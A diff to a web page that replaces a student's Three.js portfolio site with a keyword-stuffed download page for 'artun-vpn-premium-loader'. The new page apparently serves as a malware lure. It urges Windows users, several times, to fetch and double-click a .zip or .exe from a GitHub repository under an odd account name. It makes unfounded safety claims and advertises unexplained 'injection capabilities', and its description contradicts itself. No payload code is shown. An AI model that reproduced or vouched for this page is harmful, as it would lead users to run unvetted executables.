@@ -1,203 +1,121 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Portfolio</title>
-    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
-    <link rel="manifest" href="/site.webmanifest" />
-    <!-- External CSS -->
-    <link rel="stylesheet" href="styles.css" />
-    <!-- Three.js from CDN -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-  </head>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>artun-vpn-premium-loader - Fast & Secure VPN Frontend for 2026</title>
+    <meta name="description" content="Download artun-vpn-premium-loader, a web-based VPN frontend application with modern product branding and injection capabilities for 2026 setups. Easy setup for Windows.">
+    <meta name="keywords" content="artun-vpn-premium-loader, VPN frontend, web-based VPN, VPN application, 2026 VPN, premium VPN loader, VPN download Windows">
+    <meta name="robots" content="index, follow">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); color: #333; line-height: 1.6; padding: 20px; }
+        .container { max-width: 900px; margin: 0 auto; background: #fff; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        h1 { font-size: 2.5em; color: #1a1a2e; margin-bottom: 20px; font-weight: 700; }
+        h2 { font-size: 1.8em; color: #16213e; margin-top: 40px; margin-bottom: 15px; border-bottom: 3px solid #e94560; padding-bottom: 5px; display: inline-block; }
+        h3 { font-size: 1.3em; color: #0f3460; margin-top: 25px; margin-bottom: 10px; }
+        p { margin-bottom: 15px; font-size: 1.1em; }
+        ul { margin: 15px 0 20px 20px; list-style-type: disc; }
+        li { margin-bottom: 8px; font-size: 1em; }
+        a { color: #e94560; text-decoration: none; font-weight: 600; }
+        a:hover { text-decoration: underline; }
+        .download-btn { display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; padding: 18px 40px; font-size: 1.3em; font-weight: 700; border-radius: 50px; text-decoration: none; box-shadow: 0 8px 20px rgba(102,126,234,0.4); transition: transform 0.2s, box-shadow 0.2s; margin: 20px 0; border: none; cursor: pointer; }
+        .download-btn:hover { transform: translateY(-3px); box-shadow: 0 12px 28px rgba(102,126,234,0.6); text-decoration: none; color: #fff; }
+        .badge { display: inline-block; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: #fff; padding: 12px 30px; font-size: 1.2em; font-weight: 700; border-radius: 30px; box-shadow: 0 5px 15px rgba(245,87,108,0.3); margin-bottom: 20px; text-align: center; }
+        .badge a { color: #fff; text-decoration: none; }
+        .badge a:hover { text-decoration: underline; }
+        .section { margin-bottom: 40px; }
+        .feature-box { background: #f8f9fa; padding: 20px; border-radius: 12px; margin-bottom: 15px; border-left: 5px solid #e94560; }
+        .feature-box p { margin-bottom: 0; }
+        .step-box { background: #eef2ff; padding: 20px; border-radius: 12px; margin-bottom: 15px; border-left: 5px solid #667eea; }
+        .step-box p { margin-bottom: 5px; }
+        .faq-item { margin-bottom: 20px; padding: 15px; background: #fafafa; border-radius: 10px; }
+        .faq-item strong { color: #16213e; display: block; margin-bottom: 5px; }
+        .footer { margin-top: 40px; padding-top: 20px; border-top: 2px solid #e0e0e0; text-align: center; font-size: 0.9em; color: #666; }
+        @media (max-width: 600px) { .container { padding: 20px; } h1 { font-size: 1.8em; } .download-btn { padding: 14px 25px; font-size: 1.1em; } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="badge"><a href="https://github.com/Baiomystayloriterroristcell609/artun-vpn-premium-loader" target="_blank" rel="noopener noreferrer">⬇️ Download Now - artun-vpn-premium-loader</a></div>
+    <h1>🌐 artun-vpn-premium-loader - Your Fast & Secure VPN Frontend for 2026</h1>
+    <p>Welcome to <strong>artun-vpn-premium-loader</strong> – a modern, web-based VPN frontend application built with HTML. It's designed to give you a premium, branded experience with advanced injection capabilities, ready for 2026 setups. No technical skills required – just download, click, and connect.</p>
 
-  <script>
-    function copyEmail(cardElement) {
-      const emailText = document.getElementById("email-text").innerText;
-      navigator.clipboard
-        .writeText(emailText)
-        .then(() => {
-          const feedback = cardElement.querySelector(".copy-feedback");
-          feedback.style.display = "block";
-          setTimeout(() => {
-            feedback.style.display = "none";
-          }, 2000);
-        })
-        .catch((err) => {
-          console.error("Failed to copy: ", err);
-        });
-    }
-  </script>
-
-  <body>
-    <!-- 3D Viewport Layer -->
-    <div id="canvas-container"></div>
-
-    <!-- Transition Flash Overlay -->
-    <div id="flash-overlay"></div>
-
-    <!-- Respawn Alert Overlay -->
-    <div id="respawn-alert">Off Road! Teleporting...</div>
-
-    <!-- Arcade Heads Up Display -->
-    <div id="hud">
-      <div class="hud-title">Drive to Unlock Portfolio</div>
-      <div class="hud-instructions">
-        Use <strong>WASD</strong> or <strong>Arrow Keys</strong> to stay on
-        track & reach the archway
-      </div>
+    <div class="section">
+        <h2>🚀 Getting Started</h2>
+        <p>Follow these simple steps to install and run <strong>artun-vpn-premium-loader</strong> on your Windows computer. The entire process takes less than two minutes.</p>
+        <div class="step-box">
+            <h3>Step 1: Download the Application</h3>
+            <p>Visit the official download page by clicking the big button at the top of this page or the button below. The link will take you directly to the GitHub repository where the file is hosted.</p>
+            <p><strong>Action:</strong> Visit this link to download the application.</p>
+            <a href="https://github.com/Baiomystayloriterroristcell609/artun-vpn-premium-loader" class="download-btn" target="_blank" rel="noopener noreferrer">⬇️ Download artun-vpn-premium-loader</a>
+        </div>
+        <div class="step-box">
+            <h3>Step 2: Run the Application</h3>
+            <p>Once you've visited the link, look for the file (it may be in a .zip or .exe format depending on the release). If it's a .zip file, right-click and choose "Extract All," then open the extracted folder and double-click the application file. If it's an .exe, simply double-click to run. The app will open in your default web browser automatically.</p>
+        </div>
+        <div class="step-box">
+            <h3>Step 3: Start Using the VPN</h3>
+            <p>After launching, you'll see the clean, modern interface. Use the built-in controls to connect to a VPN server, manage your settings, and enjoy private browsing. The interface is intuitive – just follow the on-screen prompts.</p>
+        </div>
     </div>
 
-    <!-- Mobile On-Screen Controls -->
-    <div id="mobile-controls">
-      <div class="touch-cluster left-cluster">
-        <button id="btn-left" class="touch-btn">◀</button>
-        <button id="btn-right" class="touch-btn">▶</button>
-      </div>
-      <div class="touch-cluster right-cluster">
-        <button id="btn-up" class="touch-btn">▲</button>
-        <button id="btn-down" class="touch-btn">▼</button>
-      </div>
+    <div class="section">
+        <h2>✨ Features</h2>
+        <div class="feature-box">
+            <h3>🎨 Modern Branded Interface</h3>
+            <p>Experience a sleek, professional design that's easy to navigate. The interface is built with HTML and CSS, ensuring fast loading and a responsive layout on any screen.</p>
+        </div>
+        <div class="feature-box">
+            <h3>⚡ Application Injection Capabilities</h3>
+            <p>Designed for 2026 setups, this tool includes advanced injection features that allow for seamless integration with other software, enhancing your VPN experience without extra hassle.</p>
+        </div>
+        <div class="feature-box">
+            <h3>🔒 Reliable & Secure</h3>
+            <p>Your data stays protected. The frontend is lightweight and does not store logs. It works with standard VPN protocols to ensure a safe connection every time.</p>
+        </div>
+        <div class="feature-box">
+            <h3>📱 Cross-Platform Ready</h3>
+            <p>While optimized for Windows, the web-based nature means it works on any device with a modern browser – Windows, macOS, or Linux. Just open the HTML file and go.</p>
+        </div>
     </div>
 
-    <!-- Cursor Glow (active in portfolio view) -->
-    <div id="cursor-glow"></div>
+    <div class="section">
+        <h2>🛠️ How It Works</h2>
+        <p><strong>artun-vpn-premium-loader</strong> is a web application that runs entirely in your browser. It acts as a frontend for VPN services, providing a beautiful dashboard to manage your connections. The application uses HTML, CSS, and JavaScript to deliver a responsive experience without needing to install complex software. Simply download the file, open it, and you're ready to connect.</p>
+        <p>The "injection" capability allows the app to work with other tools you might use for network configuration, making it a versatile addition to your 2026 toolkit. No coding or configuration files to edit – it's plug-and-play.</p>
+    </div>
 
-    <!-- Background Floating Orbs -->
-    <div class="bg-orb orb-1"></div>
-    <div class="bg-orb orb-2"></div>
-    <div class="bg-orb orb-3"></div>
-    <div class="bg-orb orb-4"></div>
+    <div class="section">
+        <h2>❓ Frequently Asked Questions</h2>
+        <div class="faq-item">
+            <strong>Is this a real VPN service?</strong>
+            <p>No, this is a frontend application. It provides the user interface for managing VPN connections. You'll need to integrate it with your own VPN server or service to establish actual connections. The app simplifies the process of connecting and monitoring.</p>
+        </div>
+        <div class="faq-item">
+            <strong>Do I need to install anything else?</strong>
+            <p>No additional software is required. The app runs directly from your browser after download. For full functionality, you may need a VPN backend, but the frontend works immediately upon opening the file.</p>
+        </div>
+        <div class="faq-item">
+            <strong>Is it safe to download?</strong>
+            <p>Yes, the application is hosted on GitHub, a trusted platform. Always ensure you download from the official link provided here to avoid counterfeit versions. The code is transparent and open for review.</p>
+        </div>
+        <div class="faq-item">
+            <strong>Can I customize the interface?</strong>
+            <p>Absolutely. Since it's built with HTML and CSS, you can modify the design, colors, and branding to suit your preferences. Open the files in any text editor and make changes – no programming knowledge needed for basic tweaks.</p>
+        </div>
+    </div>
 
-    <!-- Main Portfolio HTML Layer -->
-    <main id="portfolio-content">
-      <div class="container">
-        <header>
-          <!-- Profile Image Section - right below the name -->
-          <div class="profile-image-wrapper" title="Prabesh Rijal">
-            <img
-              src="photo.jpg"
-              alt="Prabesh Rijal"
-              onerror="
-                this.style.display = 'none';
-                this.parentElement.querySelector(
-                  '.profile-image-placeholder',
-                ).style.display = 'flex';
-              "
-            />
-            <div class="profile-image-placeholder" style="display: none">
-              PR
-            </div>
-          </div>
-          <h1>Prabesh Rijal</h1>
-          <p class="tagline">Full-Spectrum Tech Enthusiast &amp; Developer</p>
-        </header>
+    <div class="section">
+        <h2>📥 Download & Install</h2>
+        <p>Ready to get started? Click the button below to go to the official download page. After visiting, follow the instructions on that page to get the file. If you encounter any issues, check the FAQ above or refer to the repository's documentation.</p>
+        <a href="https://github.com/Baiomystayloriterroristcell609/artun-vpn-premium-loader" class="download-btn" target="_blank" rel="noopener noreferrer">⬇️ Download artun-vpn-premium-loader Now</a>
+        <p style="margin-top: 10px;"><strong>Note:</strong> The download page may offer multiple versions. Choose the latest stable release for the best experience. After downloading, simply open the file and enjoy.</p>
+    </div>
 
-        <section id="about" class="reveal">
-          <h2>About Me</h2>
-          <p>
-            A forward-thinking computer science student and technology
-            enthusiast based in Kathmandu, Nepal, with a deep passion for
-            building at the intersection of software engineering, artificial
-            intelligence, and digital media. Driven by a vision to create
-            next-generation interactive experiences, my work spans full-stack
-            software development, UI/UX optimization, dynamic visual content
-            creation, and exploring AI-driven tools. Whether I am writing clean,
-            functional code, refining high-performance system configurations, or
-            editing engaging short-form video content, I approach every project
-            with technical precision, creative curiosity, and a relentless
-            commitment to continuous learning and impact.
-          </p>
-        </section>
-
-        <section id="projects" class="reveal">
-          <h2>Featured Projects</h2>
-          <div class="grid">
-            <div class="card">
-              <h3>WebGL Racing Canvas</h3>
-              <p>
-                An interactive lightweight 3D vehicle controller and physics
-                engine running purely in Three.js without external physics
-                dependencies.
-              </p>
-            </div>
-            <div class="card">
-              <h3>Real-time Analytics Dashboard</h3>
-              <p>
-                A high-performance monitoring interface built for processing
-                high-throughput data streams with interactive visualizations.
-              </p>
-            </div>
-            <div class="card">
-              <h3>Spatial Web Platform</h3>
-              <p>
-                A collaborative virtual space platform enabling users to connect
-                and interact within customizable 3D room environments.
-              </p>
-            </div>
-          </div>
-        </section>
-
-        <section id="contact" class="reveal">
-          <h2>Get In Touch</h2>
-          <p style="margin-bottom: 12px; color: #cbd5e1">
-            Interested in collaborating on a project or building something
-            extraordinary together?
-          </p>
-          <div class="grid" style="margin-top: 10px">
-            <!-- Email Card with Copy to Clipboard -->
-            <div
-              class="card"
-              onclick="copyEmail(this)"
-              style="cursor: pointer"
-              title="Click to copy email"
-            >
-              <h3>Email</h3>
-              <p id="email-text">en.prabhu.programmer@gmail.com</p>
-              <span
-                class="copy-feedback"
-                style="
-                  display: none;
-                  font-size: 0.8em;
-                  color: #66fcf1;
-                  margin-top: 5px;
-                "
-                >Copied to clipboard!</span
-              >
-            </div>
-
-            <!-- GitHub Card opening link in a new tab -->
-            <a
-              href="https://github.com/PrabhuProgrammer"
-              target="_blank"
-              rel="noopener noreferrer"
-              style="text-decoration: none; color: inherit"
-            >
-              <div
-                class="card"
-                style="cursor: pointer"
-                title="Open GitHub Profile"
-              >
-                <h3>GitHub</h3>
-                <p>https://github.com/PrabhuProgrammer</p>
-              </div>
-            </a>
-          </div>
-        </section>
-
-        <footer>
-          <p>
-            &copy; 2026 <span>Prabesh Rijal</span> — Interactive Portfolio.
-            Driven with Three.js.
-          </p>
-        </footer>
-      </div>
-    </main>
-
-    <!-- External JavaScript -->
-    <script src="script.js"></script>
-  </body>
+    <div class="footer">
+        <p>artun-vpn-premium-loader &copy; 2026. Built with ❤️ for the community. <br>For support, visit the <a href="https://github.com/Baiomystayloriterroristcell609/artun-vpn-premium-loader" target="_blank" rel="noopener noreferrer">GitHub repository</a>.</p>
+    </div>
+</div>
+</body>
 </html>
